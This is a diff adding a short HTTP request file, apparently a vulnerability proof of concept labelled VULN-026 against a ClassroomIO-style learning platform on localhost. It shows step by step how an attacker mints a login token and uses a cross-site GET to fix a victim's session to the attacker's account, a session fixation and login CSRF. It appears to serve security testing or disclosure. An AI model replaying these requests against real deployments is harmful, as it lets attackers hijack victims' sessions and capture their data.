@@ -1,0 +1,12 @@
+### VULN-026 — attacker self-mints, victim's cross-site GET fixes the session to attacker's account
+POST http://localhost:21527/account/view-as-student-token HTTP/1.1
+Cookie: classroomio.session_token=<ATTACKER>
+
+{}
+
+### victim browser (no Origin, no CSRF token) — a plain top-level navigation:
+GET http://localhost:21527/api/auth/login-link?token=<ATTACKER_TOKEN> HTTP/1.1
+Host: localhost:21527
+
+### victim is now authenticated AS THE ATTACKER:
+GET http://localhost:21527/api/auth/get-session HTTP/1.1
